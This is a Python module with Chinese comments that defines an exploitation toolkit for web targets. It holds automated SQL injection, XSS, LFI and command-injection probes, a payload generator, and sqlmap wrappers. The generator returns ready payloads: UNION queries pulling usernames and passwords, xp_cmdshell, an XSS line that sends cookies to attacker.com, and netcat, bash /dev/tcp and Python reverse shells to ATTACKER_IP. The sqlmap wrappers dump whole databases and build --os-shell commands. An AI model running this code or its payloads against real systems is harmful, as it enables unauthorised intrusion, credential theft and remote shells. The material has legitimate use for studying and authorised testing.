"""
漏洞利用相关工具
"""
import asyncio
import aiohttp
import re
import ssl
from typing import Dict, Any, Optional, List
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
import config


class ExploitTools:
    """漏洞利用工具集"""

    def __init__(self):
        self.timeout = aiohttp.ClientTimeout(total=config.REQUEST_TIMEOUT)
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

    async def _make_request(
        self,
        url: str,
        method: str = "GET",
        data: Optional[Dict] = None,
        params: Optional[Dict] = None,
        headers: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """发送请求的内部方法"""
        request_headers = {**self.headers, **(headers or {})}
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        try:
            connector = aiohttp.TCPConnector(ssl=ssl_context)
            async with aiohttp.ClientSession(
                timeout=self.timeout,
                connector=connector
            ) as session:
                async with session.request(
                    method=method,
                    url=url,
                    data=data,
                    params=params,
                    headers=request_headers,
                    allow_redirects=False
                ) as response:
                    body = await response.text()
                    return {
                        "success": True,
                        "status_code": response.status,
                        "headers": dict(response.headers),
                        "body": body,
                        "url": str(response.url)
                    }
        except Exception as e:
            return {"success": False, "error": str(e)}

    async def sql_injection_test(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        payloads: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        SQL 注入检测

        Args:
            url: 目标 URL
            method: HTTP 方法
            params: GET 参数
            data: POST 数据
            payloads: 自定义 payload 列表

        Returns:
            检测结果
        """
        if payloads is None:
            payloads = config.SQL_PAYLOADS

        vulnerabilities = []
        test_params = params or {}
        test_data = data or {}

        # SQL 错误特征
        sql_errors = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?\Wmysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your (MySQL|MariaDB)",
            r"PostgreSQL.*?ERROR",
            r"Warning.*?\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"\bSQL Server\b.*?\bDriver",
            r"Warning.*?\W(mssql|sqlsrv)_",
            r"\bSQL Server\b.*?Error",
            r"Oracle.*?Driver",
            r"Warning.*?\W(oci|ora)_",
            r"ORA-[0-9]{5}",
            r"SQLite\/JDBCDriver",
            r"SQLite\.Exception",
            r"(Microsoft|System)\.Data\.SQLite",
            r"Warning.*?\W(sqlite_|SQLite3::)",
            r"SQLITE_ERROR",
            r"SQLite error \d+:",
            r"sqlite3.OperationalError:",
            r"SQLite3::SQLException",
            r"org\.sqlite\.JDBC",
            r"Pdo\.LitePdoAdapter",
            r"SQLiteDatabase",
            r"Unhandled.*?Exception.*?SQL"
        ]

        async def test_param(param_name: str, original_value: str, is_post: bool = False):
            results = []
            for payload in payloads:
                test_value = f"{original_value}{payload}"

                if is_post:
                    modified_data = {**test_data, param_name: test_value}
                    result = await self._make_request(url, "POST", data=modified_data)
                else:
                    modified_params = {**test_params, param_name: test_value}
                    result = await self._make_request(url, "GET", params=modified_params)

                if not result.get("success"):
                    continue

                body = result.get("body", "")

                # 检查 SQL 错误
                for error_pattern in sql_errors:
                    if re.search(error_pattern, body, re.IGNORECASE):
                        results.append({
                            "param": param_name,
                            "payload": payload,
                            "type": "error_based",
                            "evidence": re.search(error_pattern, body, re.IGNORECASE).group()[:100],
                            "method": "POST" if is_post else "GET"
                        })
                        break

            return results

        # 测试 GET 参数
        for param_name, value in test_params.items():
            vuln_results = await test_param(param_name, value, is_post=False)
            vulnerabilities.extend(vuln_results)

        # 测试 POST 参数
        for param_name, value in test_data.items():
            vuln_results = await test_param(param_name, value, is_post=True)
            vulnerabilities.extend(vuln_results)

        # 基于时间的盲注测试
        time_based_payloads = [
            "' AND SLEEP(3)--",
            "' OR SLEEP(3)--",
            "'; WAITFOR DELAY '0:0:3'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
        ]

        for param_name, value in {**test_params, **test_data}.items():
            for payload in time_based_payloads:
                test_value = f"{value}{payload}"

                import time
                start_time = time.time()

                if param_name in test_data:
                    modified_data = {**test_data, param_name: test_value}
                    result = await self._make_request(url, "POST", data=modified_data)
                else:
                    modified_params = {**test_params, param_name: test_value}
                    result = await self._make_request(url, "GET", params=modified_params)

                elapsed = time.time() - start_time

                if elapsed >= 2.5:  # 响应延迟超过 2.5 秒
                    vulnerabilities.append({
                        "param": param_name,
                        "payload": payload,
                        "type": "time_based_blind",
                        "evidence": f"Response delayed by {elapsed:.2f} seconds",
                        "method": "POST" if param_name in test_data else "GET"
                    })
                    break  # 发现一个就够了

        return {
            "success": True,
            "url": url,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "tested_params": list(test_params.keys()) + list(test_data.keys())
        }

    async def xss_test(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        payloads: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        XSS 漏洞检测

        Args:
            url: 目标 URL
            method: HTTP 方法
            params: GET 参数
            data: POST 数据
            payloads: 自定义 payload 列表

        Returns:
            检测结果
        """
        if payloads is None:
            payloads = config.XSS_PAYLOADS

        vulnerabilities = []
        test_params = params or {}
        test_data = data or {}

        async def test_param(param_name: str, original_value: str, is_post: bool = False):
            results = []
            for payload in payloads:
                test_value = f"{original_value}{payload}"

                if is_post:
                    modified_data = {**test_data, param_name: test_value}
                    result = await self._make_request(url, "POST", data=modified_data)
                else:
                    modified_params = {**test_params, param_name: test_value}
                    result = await self._make_request(url, "GET", params=modified_params)

                if not result.get("success"):
                    continue

                body = result.get("body", "")

                # 检查 payload 是否被反射
                if payload in body:
                    results.append({
                        "param": param_name,
                        "payload": payload,
                        "type": "reflected",
                        "evidence": "Payload reflected in response",
                        "method": "POST" if is_post else "GET"
                    })

            return results

        # 测试所有参数
        for param_name, value in test_params.items():
            vuln_results = await test_param(param_name, value, is_post=False)
            vulnerabilities.extend(vuln_results)

        for param_name, value in test_data.items():
            vuln_results = await test_param(param_name, value, is_post=True)
            vulnerabilities.extend(vuln_results)

        return {
            "success": True,
            "url": url,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "tested_params": list(test_params.keys()) + list(test_data.keys())
        }

    async def lfi_test(
        self,
        url: str,
        param: str,
        payloads: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        本地文件包含 (LFI) 漏洞检测

        Args:
            url: 目标 URL
            param: 待测试的参数名
            payloads: 自定义 payload 列表

        Returns:
            检测结果
        """
        if payloads is None:
            payloads = [
                "../etc/passwd",
                "../../etc/passwd",
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "../../../../../etc/passwd",
                "..%2f..%2f..%2f..%2fetc%2fpasswd",
                "....//....//....//....//etc/passwd",
                "/etc/passwd",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
                "/etc/passwd%00",
                "../../../etc/passwd%00.php",
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
            ]

        vulnerabilities = []

        # LFI 成功的特征
        lfi_indicators = [
            r"root:.*?:0:0:",  # /etc/passwd
            r"\[extensions\]",  # php.ini
            r"# Host Database",  # /etc/hosts
            r"localhost",
            r"127\.0\.0\.1",
        ]

        for payload in payloads:
            result = await self._make_request(url, "GET", params={param: payload})

            if not result.get("success"):
                continue

            body = result.get("body", "")

            for indicator in lfi_indicators:
                if re.search(indicator, body):
                    vulnerabilities.append({
                        "param": param,
                        "payload": payload,
                        "type": "lfi",
                        "evidence": re.search(indicator, body).group()[:100]
                    })
                    break

        return {
            "success": True,
            "url": url,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities
        }

    async def command_injection_test(
        self,
        url: str,
        method: str = "GET",
        params: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """
        命令注入漏洞检测

        Args:
            url: 目标 URL
            method: HTTP 方法
            params: GET 参数
            data: POST 数据

        Returns:
            检测结果
        """
        payloads = [
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
            "| dir",
            "& dir",
            "; ls -la",
            "| ls -la",
        ]

        # 命令执行成功的特征
        cmd_indicators = [
            r"uid=\d+\(\w+\)",  # id 命令
            r"root:.*?:0:0:",   # /etc/passwd
            r"gid=\d+",
            r"groups=\d+",
            r"Directory of",    # Windows dir
            r"total \d+",       # ls 输出
            r"drwx",            # ls 输出
        ]

        vulnerabilities = []
        test_params = params or {}
        test_data = data or {}

        async def test_param(param_name: str, original_value: str, is_post: bool = False):
            results = []
            for payload in payloads:
                test_value = f"{original_value}{payload}"

                if is_post:
                    modified_data = {**test_data, param_name: test_value}
                    result = await self._make_request(url, "POST", data=modified_data)
                else:
                    modified_params = {**test_params, param_name: test_value}
                    result = await self._make_request(url, "GET", params=modified_params)

                if not result.get("success"):
                    continue

                body = result.get("body", "")

                for indicator in cmd_indicators:
                    if re.search(indicator, body):
                        results.append({
                            "param": param_name,
                            "payload": payload,
                            "type": "command_injection",
                            "evidence": re.search(indicator, body).group()[:100],
                            "method": "POST" if is_post else "GET"
                        })
                        break

            return results

        for param_name, value in test_params.items():
            vuln_results = await test_param(param_name, value, is_post=False)
            vulnerabilities.extend(vuln_results)

        for param_name, value in test_data.items():
            vuln_results = await test_param(param_name, value, is_post=True)
            vulnerabilities.extend(vuln_results)

        return {
            "success": True,
            "url": url,
            "vulnerable": len(vulnerabilities) > 0,
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities
        }

    async def generate_payload(
        self,
        vuln_type: str,
        target_db: str = "mysql",
        context: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """
        生成漏洞利用 Payload

        Args:
            vuln_type: 漏洞类型 (sqli, xss, lfi, rce)
            target_db: 目标数据库类型
            context: 上下文信息

        Returns:
            生成的 payload 列表
        """
        payloads = []

        if vuln_type == "sqli":
            if target_db == "mysql":
                payloads = [
                    # 信息获取
                    "' UNION SELECT @@version,NULL--",
                    "' UNION SELECT user(),database()--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                    "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
                    # 数据提取
                    "' UNION SELECT username,password FROM users--",
                    # 绕过技术
                    "' OR '1'='1'--",
                    "admin'--",
                    "' OR ''='",
                ]
            elif target_db == "mssql":
                payloads = [
                    "' UNION SELECT @@version,NULL--",
                    "'; EXEC xp_cmdshell('whoami')--",
                    "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--",
                ]
            elif target_db == "postgresql":
                payloads = [
                    "' UNION SELECT version(),NULL--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                ]

        elif vuln_type == "xss":
            payloads = [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(document.domain)>",
                "<svg/onload=alert(document.domain)>",
                "'\"><script>alert(document.domain)</script>",
                "<body onload=alert(document.domain)>",
                "javascript:alert(document.domain)",
                "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",
            ]

        elif vuln_type == "lfi":
            payloads = [
                "php://filter/convert.base64-encode/resource=../config.php",
                "php://filter/convert.base64-encode/resource=../includes/db.php",
                "/proc/self/environ",
                "/var/log/apache2/access.log",
                "/var/log/apache2/error.log",
            ]

        elif vuln_type == "rce":
            payloads = [
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "`cat /etc/passwd`",
                "$(cat /etc/passwd)",
                "; nc -e /bin/bash ATTACKER_IP 4444",
                "; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            ]

        return {
            "success": True,
            "vuln_type": vuln_type,
            "target_db": target_db,
            "payload_count": len(payloads),
            "payloads": payloads
        }

    async def _get_sqlmap_cmd(self) -> Optional[List[str]]:
        """检测 sqlmap 可用的调用方式，返回命令列表"""
        import sys
        import os

        # 获取 Python 解释器路径
        python_exe = sys.executable

        # 尝试不同的调用方式
        # 优先使用直接调用 sqlmap.py 的方式
        commands = []

        # 1. 尝试从 site-packages 找到 sqlmap.py
        try:
            import sqlmap
            sqlmap_dir = os.path.dirname(sqlmap.__file__)
            sqlmap_py = os.path.join(sqlmap_dir, "sqlmap.py")
            if os.path.exists(sqlmap_py):
                commands.append([python_exe, sqlmap_py])
        except ImportError:
            pass

        # 2. 常见路径
        possible_paths = [
            os.path.join(os.path.dirname(python_exe), "Lib", "site-packages", "sqlmap", "sqlmap.py"),
            os.path.join(sys.prefix, "Lib", "site-packages", "sqlmap", "sqlmap.py"),
            os.path.join(sys.prefix, "lib", "python" + str(sys.version_info.major) + "." + str(sys.version_info.minor), "site-packages", "sqlmap", "sqlmap.py"),
        ]

        for path in possible_paths:
            if os.path.exists(path):
                commands.append([python_exe, path])
                break

        # 3. 直接调用 sqlmap 命令（如果在 PATH 中）
        commands.append(["sqlmap"])

        for cmd_list in commands:
            try:
                # 使用 -h 来检测，因为它不会等待输入
                test_cmd = cmd_list + ["-h"]

                process = await asyncio.create_subprocess_exec(
                    *test_cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await asyncio.wait_for(process.communicate(), timeout=10)

                # 检查输出中是否包含 sqlmap 特征
                output = stdout.decode('utf-8', errors='ignore')
                if "sqlmap" in output.lower() and "target" in output.lower():
                    return cmd_list
            except Exception:
                continue
        return None

    async def sqlmap_scan(
        self,
        url: str,
        data: Optional[str] = None,
        param: Optional[str] = None,
        level: int = 1,
        risk: int = 1,
        technique: Optional[str] = None,
        dbms: Optional[str] = None,
        batch: bool = True,
        timeout: int = 300
    ) -> Dict[str, Any]:
        """
        使用 sqlmap 进行 SQL 注入检测

        Args:
            url: 目标 URL (带参数，如 http://target.com/page.php?id=1)
            data: POST 数据 (如 "username=admin&password=test")
            param: 指定测试的参数名 (可选)
            level: 测试等级 1-5 (默认1，越高越全面但越慢)
            risk: 风险等级 1-3 (默认1，越高测试越激进)
            technique: 注入技术 B=布尔盲注,E=报错,U=联合,S=堆叠,T=时间盲注
            dbms: 指定数据库类型 (mysql/oracle/mssql/postgresql)
            batch: 自动选择默认选项
            timeout: 超时时间(秒)

        Returns:
            sqlmap 扫描结果
        """
        # 检查 sqlmap 是否可用
        sqlmap_cmd = await self._get_sqlmap_cmd()
        if not sqlmap_cmd:
            return {
                "success": False,
                "error": "sqlmap 工具不可用。请确保已安装: pip install sqlmap"
            }

        # 构建 sqlmap 命令参数列表
        cmd_args = ["-u", url]

        if data:
            cmd_args.extend(["--data", data])

        if param:
            cmd_args.extend(["-p", param])

        cmd_args.extend(["--level", str(level)])
        cmd_args.extend(["--risk", str(risk)])

        if technique:
            cmd_args.extend(["--technique", technique])

        if dbms:
            cmd_args.extend(["--dbms", dbms])

        if batch:
            cmd_args.append("--batch")

        # 禁用颜色输出，方便解析
        cmd_args.append("--disable-coloring")

        # 组合完整命令列表
        cmd_list = sqlmap_cmd + cmd_args
        cmd_display = " ".join(cmd_list)  # 用于显示

        try:
            process = await asyncio.create_subprocess_exec(
                *cmd_list,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )

            output = stdout.decode('utf-8', errors='ignore')
            err_output = stderr.decode('utf-8', errors='ignore')

            # 如果 stdout 为空但 stderr 有内容，使用 stderr
            if not output and err_output:
                output = err_output

            # 解析结果
            result = {
                "success": True,
                "url": url,
                "command": cmd_display,
                "vulnerable": False,
                "injection_points": [],
                "dbms": None,
                "raw_output": output[-5000:] if len(output) > 5000 else output  # 限制输出大小
            }

            # 检测是否发现注入
            if "is vulnerable" in output or "injectable" in output.lower():
                result["vulnerable"] = True

            # 提取注入点信息
            if "Parameter:" in output:
                import re
                params = re.findall(r"Parameter: (\S+)", output)
                result["injection_points"] = list(set(params))

            # 提取数据库类型
            dbms_match = re.search(r"back-end DBMS: (.+?)(?:\n|$)", output)
            if dbms_match:
                result["dbms"] = dbms_match.group(1).strip()

            return result

        except asyncio.TimeoutError:
            return {"success": False, "error": f"sqlmap 扫描超时 ({timeout}s)"}
        except Exception as e:
            return {"success": False, "error": f"sqlmap 执行失败: {str(e)}"}

    async def sqlmap_dump(
        self,
        url: str,
        data: Optional[str] = None,
        database: Optional[str] = None,
        table: Optional[str] = None,
        columns: Optional[str] = None,
        dump_all: bool = False,
        batch: bool = True,
        timeout: int = 600
    ) -> Dict[str, Any]:
        """
        使用 sqlmap 导出数据库数据

        Args:
            url: 目标 URL
            data: POST 数据
            database: 指定数据库名
            table: 指定表名
            columns: 指定列名 (逗号分隔)
            dump_all: 导出所有数据
            batch: 自动模式
            timeout: 超时时间

        Returns:
            导出结果
        """
        sqlmap_cmd = await self._get_sqlmap_cmd()
        if not sqlmap_cmd:
            return {
                "success": False,
                "error": "sqlmap 工具不可用。请确保已安装: pip install sqlmap"
            }

        # 构建命令参数列表
        cmd_args = ["-u", url, "--batch", "--disable-coloring"]

        if data:
            cmd_args.extend(["--data", data])

        if dump_all:
            cmd_args.append("--dump-all")
        elif database and table:
            cmd_args.extend(["-D", database, "-T", table])
            if columns:
                cmd_args.extend(["-C", columns])
            cmd_args.append("--dump")
        elif database:
            cmd_args.extend(["-D", database, "--tables"])
        else:
            cmd_args.append("--dbs")  # 列出所有数据库

        # 组合完整命令列表
        cmd_list = sqlmap_cmd + cmd_args
        cmd_display = " ".join(cmd_list)

        try:
            process = await asyncio.create_subprocess_exec(
                *cmd_list,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )

            output = stdout.decode('utf-8', errors='ignore')
            if not output:
                output = stderr.decode('utf-8', errors='ignore')

            # 解析结果
            result = {
                "success": True,
                "url": url,
                "command": cmd_display,
                "databases": [],
                "tables": [],
                "data": [],
                "raw_output": output[-8000:] if len(output) > 8000 else output
            }

            # 提取数据库列表
            if "available databases" in output:
                import re
                dbs = re.findall(r"\[\*\] (\S+)", output)
                result["databases"] = dbs

            # 提取表列表
            if "Database:" in output and "Table" in output:
                tables = re.findall(r"\| (\S+)\s+\|", output)
                result["tables"] = [t for t in tables if t not in ['Table', '---']]

            return result

        except asyncio.TimeoutError:
            return {"success": False, "error": f"sqlmap 导出超时 ({timeout}s)"}
        except Exception as e:
            return {"success": False, "error": f"sqlmap 执行失败: {str(e)}"}

    async def sqlmap_shell(
        self,
        url: str,
        shell_type: str = "sql",
        data: Optional[str] = None,
        batch: bool = True
    ) -> Dict[str, Any]:
        """
        使用 sqlmap 获取 shell

        Args:
            url: 目标 URL
            shell_type: shell 类型 (sql=SQL shell, os=系统 shell)
            data: POST 数据
            batch: 自动模式

        Returns:
            shell 获取结果提示
        """
        sqlmap_cmd = await self._get_sqlmap_cmd()
        if not sqlmap_cmd:
            return {
                "success": False,
                "error": "sqlmap 工具不可用。请确保已安装: pip install sqlmap"
            }

        # 注意：这个方法主要是提供命令参考，实际交互式 shell 需要手动执行
        cmd_args = ["-u", url]

        if data:
            cmd_args.extend(["--data", data])

        if shell_type == "sql":
            cmd_args.append("--sql-shell")
        elif shell_type == "os":
            cmd_args.append("--os-shell")

        if batch:
            cmd_args.append("--batch")

        # 组合完整命令
        cmd_list = sqlmap_cmd + cmd_args
        cmd = " ".join(cmd_list)

        return {
            "success": True,
            "message": f"获取 {shell_type} shell 需要交互式执行",
            "command": cmd,
            "instructions": [
                f"请在终端手动执行以下命令:",
                cmd,
                "",
                "注意事项:",
                "- --sql-shell: 获取 SQL 交互式 shell",
                "- --os-shell: 尝试获取系统 shell (需要高权限)",
                "- 获取 shell 后可执行任意 SQL/系统命令"
            ]
        }
